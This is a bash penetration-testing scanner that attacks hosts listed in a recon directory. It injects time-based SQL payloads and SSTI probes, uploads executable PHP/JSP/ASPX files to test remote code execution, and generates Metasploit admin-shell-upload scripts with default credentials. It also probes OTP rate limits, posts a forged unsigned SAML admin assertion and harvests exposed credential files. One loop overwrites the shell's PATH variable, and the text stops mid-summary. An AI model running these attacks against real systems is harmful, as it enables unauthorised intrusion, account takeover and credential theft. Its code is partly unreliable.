#!/bin/bash
# =============================================================================
# VAPT Vulnerability Scanner v5 — Verified PoC Generation
#
# Usage: ./scanner.sh <recon_dir> [--quick] [--full] [--skip xss,sqli,...]
#
# UPDATED IN V5:
#   • Bash 3.2 compatible (macOS)
#   • Improved RCE Execution PoC (PHP/JSP/ASPX)
#   • Linear-Scaling SQLi Verifier
#   • Race Condition detection (xargs -P20)
#   • SSTI math-canary probes (Jinja2/Freemarker/Thymeleaf/ERB)
#   • dalfox XSS pipeline integration
# =============================================================================

set -uo pipefail

# ── Colours ──────────────────────────────────────────────────────────────────
GREEN='\033[0;32m'
RED='\033[0;31m'
YELLOW='\033[1;33m'
CYAN='\033[0;36m'
MAGENTA='\033[0;35m'
BOLD='\033[1m'
NC='\033[0m'

log_ok()    { echo -e "${GREEN}[$(ts)] [+]${NC} $1"; }
log_err()   { echo -e "${RED}[$(ts)] [-]${NC} $1"; }
log_warn()  { echo -e "${YELLOW}[$(ts)] [!]${NC} $1"; }
log_info()  { echo -e "${CYAN}[$(ts)] [*]${NC} $1"; }
log_step()  { echo -e "    ${CYAN}[$(ts)] [>]${NC} $1"; }
log_done()  { echo -e "    ${GREEN}[$(ts)] [✓]${NC} $1"; }
log_vuln()  { echo -e "    ${RED}${BOLD}[$(ts)] [VULN]${NC} $1"; }
log_crit()  { echo -e "    ${MAGENTA}${BOLD}[$(ts)] [CRITICAL]${NC} $1"; }
ts()        { date '+%Y-%m-%d %H:%M:%S'; }

# ── Config ────────────────────────────────────────────────────────────────────
RECON_DIR=""
QUICK_MODE=""
FULL_MODE=""
SKIP_CHECKS=""

while [ "$#" -gt 0 ]; do
    arg="$1"
    case "$arg" in
        --quick) QUICK_MODE="--quick" ;;
        --full) FULL_MODE="--full" ;;
        --skip) shift; SKIP_CHECKS="${SKIP_CHECKS:-}${SKIP_CHECKS:+,}$1" ;;
        *) RECON_DIR="$arg" ;;
    esac
    shift
done

if [ -z "$RECON_DIR" ] || [ ! -d "$RECON_DIR" ]; then
    echo "Usage: $0 <recon_dir> [--quick] [--full] [--skip xss,sqli,...]" >&2
    exit 1
fi

SCRIPT_DIR="$(cd "$(dirname "$0")" && pwd)"
BASE_DIR="$SCRIPT_DIR"
SESSION_ID=$(basename "$RECON_DIR")
TARGET=$(basename "$(dirname "$(dirname "$RECON_DIR")")")
FINDINGS_DIR="${FINDINGS_OUT_DIR:-$BASE_DIR/findings/$TARGET/sessions/$SESSION_ID}"

export PATH="$HOME/go/bin:/usr/local/bin:/opt/homebrew/bin:$PATH"
export PRIORITY_DIR="$RECON_DIR/priority"
export FINDINGS_DIR

CURL_TIMEOUT=60
mkdir -p "$FINDINGS_DIR"/{upload,xss,sqli,takeover,misconfig,exposure,ssrf,cves,redirects,idor,auth_bypass,lfi,ssti,graphql,cors,jwt,smuggling,cloud,manual_review,metasploit,.tmp}

# ── Helpers ───────────────────────────────────────────────────────────────────
file_lines()  { [ -f "${1:-}" ] && wc -l < "$1" | tr -d ' ' || echo 0; }
tool_ok()     { command -v "$1" &>/dev/null; }
count_vuln() { local file="$1"; [ -f "$file" ] && [ -s "$file" ] && wc -l < "$file" | tr -d ' ' || echo 0; }

_has_skip() {
    local source="${1:-}"
    local want="${2:-}"
    [[ ",$source," == *",$want,"* ]] || [[ ",$source," == *",all,"* ]]
}

skip_has() { _has_skip "${SKIP_CHECKS:-}" "$1" || { [ "$FULL_MODE" != "--full" ] && _has_skip "xss,lfi,ssti,ssrf,cors,takeover,misconfig,jwt,graphql,smuggling,redirects,idor,auth_bypass,host_header,exposure,cloud,race" "$1"; }; }

# ── Maturity Module: Advanced Verification Logic ─────────────────────────────

verify_sqli_poc() {
    local url="$1"; local p_idx="$2"; local dialect="$3"
    log_step "  [VERIFY] Linear scaling check on param #$p_idx ($dialect)..."
    
    # 1. Baseline (0s)
    T0_START=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "$url"; T0=$(( ($(date +%s%N) - T0_START) / 1000000 ))
    
    # 2. 1s Sleep
    local pl1="'%20AND%20SLEEP(1)--%20"; [ "$dialect" = "postgres" ] && pl1="'||pg_sleep(1)--%20"
    U1=$(echo "$url" | sed "s/=\([^&]*\)/=$pl1/$p_idx")
    T1_START=$(date +%s%N); curl -sk -o /dev/null --max-time 25 "$U1"; T1=$(( ($(date +%s%N) - T1_START) / 1000000 ))
    
    # 3. 2s Sleep
    local pl2="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && pl2="'||pg_sleep(2)--%20"
    U2=$(echo "$url" | sed "s/=\([^&]*\)/=$pl2/$p_idx")
    T2_START=$(date +%s%N); curl -sk -o /dev/null --max-time 30 "$U2"; T2=$(( ($(date +%s%N) - T2_START) / 1000000 ))
    
    D1=$(( T1 - T0 )); D2=$(( T2 - T1 ))
    # Allow 200ms jitter
    if [ "$D1" -gt 800 ] && [ "$D2" -gt 800 ]; then
        log_crit "  [POC-CONFIRMED] Linear scaling: T0=${T0}ms T1=${T1}ms T2=${T2}ms"
        return 0
    fi
    return 1
}

verify_upload_poc() {
    local upload_url="$1"; local base_url=$(echo "$upload_url" | cut -d'/' -f1-3); local ts=$(date +%s)
    
    # Tech Detection
    local ext="php"; local payload='<?php echo "RCE-VAL-".(7*7); ?>'
    local headers=$(curl -sk -I --max-time 5 "$upload_url" || true)
    if echo "$headers" | grep -qi "jsp\|java\|tomcat"; then ext="jsp"; payload='<% out.print("RCE-VAL-" + (7*7)); %>'; fi
    if echo "$headers" | grep -qi "asp\|aspx\|\.net"; then ext="aspx"; payload='<% Response.Write("RCE-VAL-" + (7*7)) %>'; fi
    
    local canary="proof_${ts}.${ext}"
    echo "$payload" > "/tmp/$canary"
    log_step "  [VERIFY] Attempting RCE-Execution PoC (${ext}): $upload_url..."
    
    for param in "file" "upload" "FileData" "userfile" "image"; do
        # Try upload
        curl -sk -F "${param}=@/tmp/${canary}" --max-time 10 "$upload_url" > /dev/null || true
        
        # Check common upload dirs
        for dir in "/" "/uploads/" "/files/" "/media/" "/temp/" "/images/" "/wp-content/uploads/"; do
            local probe_url="${base_url}${dir}${canary}"
            local resp=$(curl -sk -f --max-time 5 "$probe_url" || true)
            if echo "$resp" | grep -q "RCE-VAL-49"; then
                log_crit "  [POC-RCE-CONFIRMED] Code Execution Verified: $probe_url"
                echo "[RCE-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_rce_pocs.txt"
                rm -f "/tmp/$canary"; return 0
            elif echo "$resp" | grep -q "RCE-VAL-"; then
                log_vuln "  [POC-UPLOAD-ONLY] File saved but NOT executed (Source visible): $probe_url"
                echo "[UPLOAD-ONLY-POC] $probe_url" >> "$FINDINGS_DIR/upload/verified_upload_pocs.txt"
            fi
        done
    done
    rm -f "/tmp/$canary"; return 1
}

# ── Resolve scan targets ──────────────────────────────────────────────────────
ORDERED_SCAN="$FINDINGS_DIR/ordered_scan_targets.txt"
: > "$ORDERED_SCAN"
for f in "$PRIORITY_DIR/critical_hosts.txt" "$PRIORITY_DIR/high_hosts.txt" "$PRIORITY_DIR/prioritized_hosts.txt" "$RECON_DIR/live/urls.txt"; do
    [ -s "$f" ] && cat "$f" >> "$ORDERED_SCAN"
done
# Clean and uniqify
awk '!seen[$0]++' "$ORDERED_SCAN" > "${ORDERED_SCAN}.tmp" && mv "${ORDERED_SCAN}.tmp" "$ORDERED_SCAN"
[ ! -s "$ORDERED_SCAN" ] && log_err "No scan targets found" && exit 1

# ── Check 0: Upload Surface Discovery ──────────────────────────────────
if ! skip_has upload; then
    log_info "Check 0: Upload Surface Discovery"
    CATCHALL_HOSTS=""
    log_step "Detecting catchall behavior..."
    head -10 "$ORDERED_SCAN" | while read -r host; do
        [ -z "$host" ] && continue
        if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 10 "${host}/non_existent_$(date +%s)")" -eq 200 ]; then
            log_warn "Catchall detected: $host"
            CATCHALL_HOSTS="${CATCHALL_HOSTS},${host}"
        fi
    done
    PROBE_PATHS=("/upload.php" "/uploader.php" "/upload/index.php" "/filemanager/index.php" "/ckfinder/core/connector/php/connector.php" "/fckeditor/editor/filemanager/connectors/php/connector.php" "/elfinder.php" "/admin/upload")
    head -30 "$ORDERED_SCAN" | while read -r host; do
        [ -z "$host" ] && continue
        [[ "$CATCHALL_HOSTS" == *"$host"* ]] && continue
        for path in "${PROBE_PATHS[@]}"; do
            U="${host%/}${path}"
            if [ "$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 "$U")" -eq 200 ]; then
                log_vuln "Found upload path: $U"
                echo "[UPLOAD-CANDIDATE] $U" >> "$FINDINGS_DIR/upload/active_upload_probe.txt"
                verify_upload_poc "$U"
            fi
        done
    done
fi

# ── Check 2: SQL Injection ──────────────────────────────────────────────
if ! skip_has sqli; then
    log_info "Check 2: SQL Injection"
    # 2a. Nuclei
    if tool_ok nuclei; then
        log_step "nuclei SQLi templates..."
        nuclei -l "$ORDERED_SCAN" -tags sqli -severity medium,high,critical -silent -o "$FINDINGS_DIR/sqli/nuclei_sqli.txt" || true
    fi
    # 2b. Manual Linear-Scaling Probes
    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
    if [ -s "$PARAMS_FILE" ]; then
        log_step "Advanced SQLi verification on top 10 parameterised URLs..."
        head -10 "$PARAMS_FILE" | while read -r url; do
            [ -z "$url" ] && continue
            T_START=$(date +%s%N); curl -sk -o /dev/null --max-time 10 "$url"; BASE_MS=$(( ($(date +%s%N) - T_START) / 1000000 ))
            P_COUNT=$(echo "$url" | grep -o "=" | wc -l | tr -d ' ')
            [ "$P_COUNT" -eq 0 ] && continue
            for i in $(seq 1 "$P_COUNT"); do
                for dialect in "mysql" "postgres"; do
                    p="'%20AND%20SLEEP(2)--%20"; [ "$dialect" = "postgres" ] && p="'||pg_sleep(2)--%20"
                    # Fixed sed: use alternate delimiter and correct numeric occurrence
                    SU=$(echo "$url" | sed "s/=\([^&]*\)/=$p/$i")
                    TS=$(date +%s%N); curl -sk -o /dev/null --max-time 20 "$SU" >/dev/null 2>&1; RC=$?; TE=$(( ($(date +%s%N) - TS) / 1000000 ))
                    if [ "$RC" -eq 0 ] && [ "$((TE - BASE_MS))" -gt 1800 ]; then
                        if verify_sqli_poc "$url" "$i" "$dialect"; then
                            log_crit "EMPIRICAL SQLI POC: $url"
                            echo "[SQLI-POC-VERIFIED] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                            break 2
                        else
                            log_vuln "SQLi Candidate (confirmed delay but not linear): $url"
                            echo "[SQLI-CANDIDATE] dialect=$dialect param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                        fi
                    elif [ "$RC" -eq 28 ] && [ "$TE" -gt 18000 ]; then
                        log_warn "Potential SQLi (Timeout Multiplier): $url"
                        echo "[SQLI-TIMEOUT-CANDIDATE] timeout=${TE}ms param=$i url=$url" >> "$FINDINGS_DIR/sqli/timebased_candidates.txt"
                    fi
                done
            done
        done
    fi
fi

# ── Check 3: XSS ────────────────────────────────────────────────────────
if ! skip_has xss; then
    log_info "Check 3: XSS (dalfox)"
    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
    if tool_ok dalfox && [ -s "$PARAMS_FILE" ]; then
        DAL_OUT="$FINDINGS_DIR/xss/dalfox_results.txt"
        DAL_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 30 || echo 100)
        log_step "Running dalfox on up to $DAL_LIMIT URLs..."
        head -"$DAL_LIMIT" "$PARAMS_FILE" | dalfox pipe --silence --no-spinner --skip-bav --timeout 15 -o "$DAL_OUT" 2>/dev/null || true
        log_done "dalfox check done"
    fi
fi

# ── Check 4: SSTI ───────────────────────────────────────────────────────
if ! skip_has ssti; then
    log_info "Check 4: SSTI (reflected parameter probes)"
    PARAMS_FILE="$RECON_DIR/urls/with_params.txt"
    SSTI_OUT="$FINDINGS_DIR/ssti/ssti_candidates.txt"
    if [ -s "$PARAMS_FILE" ]; then
        # Removed associative array for Bash 3.2 compatibility
        # engines: jinja2, freemarker, thymeleaf, erb
        SSTI_ENGINES=("jinja2" "freemarker" "thymeleaf" "erb")
        SSTI_PAYLOADS=("{{7*7}}" "\${7*7}" "*{7*7}" "<%= 7*7 %>")
        
        SSTI_LIMIT=$([ "$QUICK_MODE" = "--quick" ] && echo 20 || echo 50)
        log_step "Testing SSTI payloads on up to $SSTI_LIMIT URLs..."
        hit=0
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            for idx in "${!SSTI_ENGINES[@]}"; do
                engine="${SSTI_ENGINES[$idx]}"
                payload="${SSTI_PAYLOADS[$idx]}"
                enc_payload=$(python3 -c "import urllib.parse; print(urllib.parse.quote('''$payload'''))" 2>/dev/null || echo "$payload")
                injected=$(echo "$url" | sed "s/=\([^&]*\)/=${enc_payload}/g")
                body=$(curl -sk --max-time 10 "$injected" 2>/dev/null || true)
                if echo "$body" | grep -qE '(\b49\b|7777777)'; then
                    log_crit "SSTI confirmed [$engine]: $injected"
                    echo "[SSTI-CONFIRMED] engine=$engine url=$injected" >> "$SSTI_OUT"
                    hit=$(( hit + 1 ))
                    break
                fi
            done
        done < <(head -"$SSTI_LIMIT" "$PARAMS_FILE")
        [ "$hit" -eq 0 ] && log_done "SSTI: clean"
    fi
fi

# ── Check 7: CMS Detection & MSF Generation ──────────────────────────────
if ! skip_has cms; then
    log_info "Check 7: CMS Detection & MSF Generation"
    head -50 "$ORDERED_SCAN" | while read -r url; do
        [ -z "$url" ] && continue
        RES=$(curl -sk --max-time 10 "$url" 2>/dev/null || true)
        CMS=""; if echo "$RES" | grep -qi "wp-content\|wordpress"; then CMS="wordpress"; elif echo "$RES" | grep -qi "drupal"; then CMS="drupal"; fi
        if [ -n "$CMS" ]; then
            log_vuln "$CMS detected: $url"
            MSF_RC="$FINDINGS_DIR/metasploit/${CMS}_$(echo "$url" | sed 's|[^a-z0-9]|_|g').rc"
            # Attempt to resolve IP for RHOSTS reliability
            HOST_PART=$(echo "$url" | cut -d'/' -f3 | cut -d':' -f1)
            RHOST_VAL=$(dig +short "$HOST_PART" | head -1)
            [ -z "$RHOST_VAL" ] && RHOST_VAL="$HOST_PART"
            
            echo "use exploit/unix/webapp/${CMS}_admin_shell_upload" > "$MSF_RC"
            echo "set RHOSTS $RHOST_VAL" >> "$MSF_RC"
            echo "set SSL $([[ "$url" == https* ]] && echo "true" || echo "false")" >> "$MSF_RC"
            echo "set TARGETURI /" >> "$MSF_RC"
            echo "set USERNAME admin" >> "$MSF_RC"
            echo "set PASSWORD admin" >> "$MSF_RC"
            log_ok "  Metasploit RC generated: $MSF_RC"
        fi
    done
fi

# ── Check 8: MFA / 2FA Bypass ─────────────────────────────────────────────────
if ! skip_has mfa; then
    log_info "Check 8: MFA / 2FA Bypass"
    mkdir -p "$FINDINGS_DIR/mfa"

    # Detect MFA/OTP endpoints from URL list
    MFA_ENDPOINTS=$(grep -iE "/(mfa|otp|2fa|verify|authenticate|token|totp|sms.code|auth.code)" \
        "$ORDERED_SCAN" 2>/dev/null | head -20 || true)

    if [ -n "$MFA_ENDPOINTS" ]; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            BASE=$(echo "$url" | cut -d'?' -f1)

            # --- Test 1: Rate limit on OTP endpoint ---
            log_step "Rate limit probe: $BASE"
            STATUS_CODES=$(for i in $(seq 1 15); do
                curl -sk -o /dev/null -w "%{http_code}\n" --max-time 5 \
                    -X POST "$BASE" \
                    -H "Content-Type: application/json" \
                    -d '{"otp":"000000"}' 2>/dev/null || echo "ERR"
            done | sort | uniq -c | sort -rn | head -5)
            if echo "$STATUS_CODES" | grep -qv "429\|ERR"; then
                log_vuln "[MFA] No rate limit detected on OTP endpoint: $BASE"
                echo "[MFA-NO-RATE-LIMIT] $BASE | codes: $STATUS_CODES" >> "$FINDINGS_DIR/mfa/findings.txt"
            fi

            # --- Test 2: MFA workflow skip (pre-MFA session to protected page) ---
            log_step "Workflow skip probe: $BASE"
            # Try accessing /dashboard, /home, /profile with a fresh (unauthenticated) session
            for PROTECTED in dashboard home profile account settings admin; do
                HOST=$(echo "$url" | grep -oE "https?://[^/]+")
                SKIP_CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                    "$HOST/$PROTECTED" 2>/dev/null || echo "0")
                if [ "$SKIP_CODE" = "200" ]; then
                    log_vuln "[MFA] Protected endpoint accessible before MFA: $HOST/$PROTECTED"
                    echo "[MFA-WORKFLOW-SKIP] $HOST/$PROTECTED accessible (HTTP 200)" >> "$FINDINGS_DIR/mfa/findings.txt"
                fi
            done

            # --- Test 3: Response manipulation canary ---
            # Check if server returns JSON with a success/failure flag (indicator only)
            RESP=$(curl -sk --max-time 5 -X POST "$BASE" \
                -H "Content-Type: application/json" \
                -d '{"otp":"999999"}' 2>/dev/null || true)
            if echo "$RESP" | grep -qi '"success"\s*:\s*false\|"verified"\s*:\s*false\|"status"\s*:\s*"fail"'; then
                log_vuln "[MFA] Response manipulation candidate (server sends JSON success flag): $BASE"
                echo "[MFA-RESPONSE-MANIP] $BASE | change false->true in response" >> "$FINDINGS_DIR/mfa/findings.txt"
            fi

        done <<< "$MFA_ENDPOINTS"
    else
        log_warn "No MFA/OTP endpoints detected in URL list"
    fi
fi

# ── Check 9: SAML / SSO Attacks ───────────────────────────────────────────────
if ! skip_has saml; then
    log_info "Check 9: SAML / SSO Attack Surface"
    mkdir -p "$FINDINGS_DIR/saml"

    # Detect SAML/SSO endpoints
    SAML_ENDPOINTS=$(grep -iE "/(saml|sso|login|auth|oauth|acs|idp|sp.init|adfs|okta|ping.fed)" \
        "$ORDERED_SCAN" 2>/dev/null | head -20 || true)
    # Also check common SAML paths on live hosts
    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -20 || true)

    while IFS= read -r host; do
        [ -z "$host" ] && continue
        for SAML_PATH in "/saml/login" "/sso/saml" "/auth/saml" "/api/auth/saml" \
                         "/login/saml" "/saml/acs" "/saml/metadata" "/adfs/ls" \
                         "/.well-known/openid-configuration"; do
            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                "${host}${SAML_PATH}" 2>/dev/null || echo "0")
            case "$CODE" in
                200|301|302|403)
                    log_vuln "[SAML] Endpoint found (HTTP $CODE): ${host}${SAML_PATH}"
                    echo "[SAML-ENDPOINT] ${host}${SAML_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/saml/endpoints.txt"
                    ;;
            esac
        done
    done <<< "$LIVE_HOSTS"

    # Metadata exposure check (reveals IdP certs, entity IDs — aids XSW)
    while IFS= read -r url; do
        [ -z "$url" ] && continue
        RESP=$(curl -sk --max-time 8 "$url" 2>/dev/null || true)
        if echo "$RESP" | grep -qi "EntityDescriptor\|IDPSSODescriptor\|X509Certificate"; then
            log_vuln "[SAML] Metadata exposed (aids XSW/cert extraction): $url"
            echo "[SAML-METADATA-EXPOSED] $url" >> "$FINDINGS_DIR/saml/findings.txt"
            # Extract cert if present
            echo "$RESP" | grep -o '<X509Certificate>[^<]*' | head -3 >> "$FINDINGS_DIR/saml/certs.txt" 2>/dev/null || true
        fi
    done <<< "$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | awk '{print $2}' || true)"

    # Signature stripping test via /saml/acs — send stripped assertion
    ACS_URL=$(cat "$FINDINGS_DIR/saml/endpoints.txt" 2>/dev/null | grep "saml/acs\|saml/login" | head -1 | awk '{print $2}' || true)
    if [ -n "$ACS_URL" ]; then
        # Minimal stripped SAMLResponse (no Signature element, NameID = admin)
        STRIPPED_SAML=$(echo '<?xml version="1.0"?><samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol" xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion"><saml:Assertion><saml:Subject><saml:NameID>admin@target.com</saml:NameID></saml:Subject></saml:Assertion></samlp:Response>' | base64 | tr -d '\n')
        CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 8 \
            -X POST "$ACS_URL" \
            -d "SAMLResponse=${STRIPPED_SAML}" 2>/dev/null || echo "0")
        if [ "$CODE" = "200" ] || [ "$CODE" = "302" ]; then
            log_vuln "[SAML] Signature stripping accepted (HTTP $CODE): $ACS_URL — CRITICAL ATO"
            echo "[SAML-SIG-STRIP] $ACS_URL | HTTP $CODE | stripped assertion accepted" >> "$FINDINGS_DIR/saml/findings.txt"
        fi
    fi

    SAML_FINDINGS=$(count_vuln "$FINDINGS_DIR/saml/findings.txt")
    [ "$SAML_FINDINGS" -gt 0 ] && log_ok "[SAML] $SAML_FINDINGS finding(s) — review $FINDINGS_DIR/saml/"
fi

# ── Check 10: Import/Export Abuse (TOP100 #1 RCE surface) ────────────────────
if ! skip_has import; then
    log_info "Check 10: Import/Export Feature Abuse"
    mkdir -p "$FINDINGS_DIR/import_export"

    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -30 || true)

    while IFS= read -r host; do
        [ -z "$host" ] && continue

        # ── Discover import/export endpoints ──
        for PATH in \
            "/import" "/export" "/api/import" "/api/export" \
            "/admin/import" "/admin/export" "/bulk/import" \
            "/api/v1/import" "/api/v2/import" \
            "/projects/import" "/repositories/import" \
            "/upload/import" "/data/import" "/migrate" \
            "/api/migrate" "/template/import" "/backup/restore"; do
            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                "${host}${PATH}" 2>/dev/null || echo "0")
            case "$CODE" in
                200|201|301|302|400|403|405|422)
                    log_vuln "[IMPORT] Endpoint exists (HTTP $CODE): ${host}${PATH}"
                    echo "[IMPORT-ENDPOINT] ${host}${PATH} | HTTP $CODE" >> "$FINDINGS_DIR/import_export/endpoints.txt"
                    ;;
            esac
        done

        # ── File converter exposure (ExifTool, ImageMagick, FFmpeg vectors) ──
        for CONV_PATH in \
            "/convert" "/api/convert" "/process" "/render" \
            "/thumbnail" "/preview" "/api/preview" \
            "/pdf" "/api/pdf" "/export/pdf" "/generate/pdf" \
            "/diagram" "/api/diagram" "/kroki" "/plantuml"; do
            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                "${host}${CONV_PATH}" 2>/dev/null || echo "0")
            if [ "$CODE" = "200" ] || [ "$CODE" = "405" ]; then
                log_vuln "[IMPORT] File converter endpoint (${CODE}): ${host}${CONV_PATH} — test ExifTool/ImageMagick RCE"
                echo "[CONVERTER-ENDPOINT] ${host}${CONV_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/import_export/converters.txt"
            fi
        done

    done <<< "$LIVE_HOSTS"

    # ── URL-based import (git flag injection surface) ──
    IMPORT_URL_ENDPOINTS=$(grep -iE "/(import|clone|mirror|fetch).*(url|uri|repo|source)" \
        "$ORDERED_SCAN" 2>/dev/null | head -10 || true)
    if [ -n "$IMPORT_URL_ENDPOINTS" ]; then
        while IFS= read -r url; do
            [ -z "$url" ] && continue
            log_vuln "[IMPORT] URL import endpoint detected — test git flag injection: $url"
            echo "[GIT-FLAG-INJECTION-CANDIDATE] $url" >> "$FINDINGS_DIR/import_export/git_injection.txt"
        done <<< "$IMPORT_URL_ENDPOINTS"
    fi

    IMPORT_COUNT=$(count_vuln "$FINDINGS_DIR/import_export/endpoints.txt")
    [ "$IMPORT_COUNT" -gt 0 ] && log_ok "[IMPORT] $IMPORT_COUNT import/export endpoint(s) found — high-priority manual test surface"
fi

# ── Check 11: Deserialization Probes ─────────────────────────────────────────
if ! skip_has deserialize; then
    log_info "Check 11: Deserialization Probes"
    mkdir -p "$FINDINGS_DIR/deserialize"

    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -20 || true)

    while IFS= read -r host; do
        [ -z "$host" ] && continue

        # ── Java deserialization: detect AC ED 00 05 magic bytes in responses ──
        # Also check for endpoints that accept serialized objects
        for JAVA_PATH in \
            "/api/deserialize" "/api/object" "/rpc" "/remoting" \
            "/invoker" "/jmxinvokerservlet" "/web-console/invoker" \
            "/cluster/pickled" "/api/pickle" "/api/marshal"; do
            RESP_HEADERS=$(curl -skI --max-time 5 "${host}${JAVA_PATH}" 2>/dev/null || true)
            CODE=$(echo "$RESP_HEADERS" | grep -oE "HTTP/[0-9.]+ [0-9]+" | tail -1 | awk '{print $2}')
            CT=$(echo "$RESP_HEADERS" | grep -i "content-type" | head -1)
            if echo "$CT" | grep -qi "java-serialized\|application/x-java\|x-java-serialized"; then
                log_vuln "[DESERIALIZE] Java serialized object endpoint: ${host}${JAVA_PATH} — ysoserial candidate"
                echo "[JAVA-DESER] ${host}${JAVA_PATH} | $CT" >> "$FINDINGS_DIR/deserialize/findings.txt"
            fi
            # JMX/JBoss/WebLogic common deser paths
            case "$CODE" in 200|500|400)
                if echo "$JAVA_PATH" | grep -qi "invoker\|jmx\|remoting"; then
                    log_vuln "[DESERIALIZE] Java RMI/JMX endpoint (HTTP $CODE): ${host}${JAVA_PATH}"
                    echo "[JAVA-RMI] ${host}${JAVA_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/deserialize/findings.txt"
                fi ;;
            esac
        done

        # ── PHP object injection: detect unserialize() call surfaces ──
        PHP_TARGETS=$(grep -iE "\.(php)(\?|$)" "$ORDERED_SCAN" 2>/dev/null | \
            grep -iE "data=|object=|session=|token=|payload=" | head -10 || true)
        if [ -n "$PHP_TARGETS" ]; then
            while IFS= read -r url; do
                [ -z "$url" ] && continue
                # Send PHP serialized string — O:4:"Test":0:{} — look for fatal error leaking class name
                RESP=$(curl -sk --max-time 5 \
                    -G --data-urlencode "data=O:4:\"Test\":0:{}" "$url" 2>/dev/null || true)
                if echo "$RESP" | grep -qi "unserialize\|__wakeup\|__destruct\|class.*not.*found\|Fatal error"; then
                    log_vuln "[DESERIALIZE] PHP object injection surface: $url"
                    echo "[PHP-DESER] $url" >> "$FINDINGS_DIR/deserialize/findings.txt"
                fi
            done <<< "$PHP_TARGETS"
        fi

    done <<< "$LIVE_HOSTS"

    DESER_COUNT=$(count_vuln "$FINDINGS_DIR/deserialize/findings.txt")
    [ "$DESER_COUNT" -gt 0 ] && log_ok "[DESERIALIZE] $DESER_COUNT deserialization surface(s) — requires manual ysoserial/PHPGGC follow-up"
fi

# ── Check 12: Supply Chain Exposure ──────────────────────────────────────────
if ! skip_has supplychain; then
    log_info "Check 12: Supply Chain Exposure"
    mkdir -p "$FINDINGS_DIR/supply_chain"

    LIVE_HOSTS=$(cat "$RECON_DIR/live/httpx_live.txt" 2>/dev/null | awk '{print $1}' | head -30 || true)

    while IFS= read -r host; do
        [ -z "$host" ] && continue

        # ── Internal package registries ──
        for REG_PATH in \
            "/artifactory" "/artifactory/api/system/ping" \
            "/nexus" "/nexus/service/rest/v1/status" \
            "/repository" "/npm" "/pypi" "/maven" \
            "/.npmrc" "/packages" "/registry" \
            "/api/packages" "/api/v1/packages"; do
            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                "${host}${REG_PATH}" 2>/dev/null || echo "0")
            case "$CODE" in
                200|201|401)
                    RESP=$(curl -sk --max-time 5 "${host}${REG_PATH}" 2>/dev/null || true)
                    if echo "$RESP" | grep -qi "artifactory\|nexus\|jfrog\|npm\|pypi\|maven\|registry"; then
                        log_vuln "[SUPPLY-CHAIN] Package registry exposed (HTTP $CODE): ${host}${REG_PATH}"
                        echo "[REGISTRY-EXPOSED] ${host}${REG_PATH} | HTTP $CODE" >> "$FINDINGS_DIR/supply_chain/findings.txt"
                    fi ;;
            esac
        done

        # ── Exposed credential/config files ──
        for CRED_PATH in \
            "/.npmrc" "/.pypirc" "/.m2/settings.xml" \
            "/pip.conf" "/requirements.txt" \
            "/Gemfile.lock" "/package-lock.json" \
            "/composer.lock" "/yarn.lock" \
            "/docker-compose.yml" "/docker-compose.yaml" \
            "/.docker/config.json" "/Dockerfile"; do
            CODE=$(curl -sk -o /dev/null -w "%{http_code}" --max-time 5 \
                "${host}${CRED_PATH}" 2>/dev/null || echo "0")
            if [ "$CODE" = "200" ]; then
                RESP=$(curl -sk --max-time 5 "${host}${CRED_PATH}" 2>/dev/null || true)
                if echo "$RESP" | grep -qiE "password|token|secret|auth|key|credential|registry_url|//npm|@scope"; then
                    log_vuln "[SUPPLY-CHAIN] Credential file exposed: ${host}${CRED_PATH}"
                    echo "[CRED-FILE] ${host}${CRED_PATH}" >> "$FINDINGS_DIR/supply_chain/findings.txt"
                    # Save snippet (first 5 lines, no full secrets in log)
                    echo "$RESP" | head -5 >> "$FINDINGS_DIR/supply_chain/snippets.txt" 2>/dev/null || true
                fi
            fi
        done

    done <<< "$LIVE_HOSTS"

    SC_COUNT=$(count_vuln "$FINDINGS_DIR/supply_chain/findings.txt")
    [ "$SC_COUNT" -gt 0 ] && log_ok "[SUPPLY-CHAIN] $SC_COUNT supply chain exposure(s) — review $FINDINGS_DIR/supply_chain/"
fi

# ── Summary ───────────────────────────────────────────────────────────────────
log_info "Scan Complete. Consolidating..."
{
    echo "Scan Date : $(date)"
    echo "Target    : $TARGET"
    echo "Verified SQLi PoCs   : $(grep -c "SQLI-POC-VERIFIED" "$FINDINGS_DIR/sqli/timebased_candidates.txt" 2>/dev/null || echo 0)"
    echo "Verified RCE PoCs    : $(count_vuln "$FINDINGS_DIR/upload/verified_rce_pocs.txt")"
    echo "Verified Upload Only : $(count_vuln "$FINDINGS_DIR/upload/verified_upload_pocs.txt")"
    echo "XSS (dalfox)         : $(count_vuln "$FINDINGS_DIR/xss/dalfox_results.txt")"
    echo "SSTI Confirmed       : $(count_vuln "$FINDINGS_DIR/ssti/ssti_candidates.txt")"
    echo "MFA Bypass Findings  : $(count_vuln "$FINDINGS_DIR/mfa/findings.txt")"
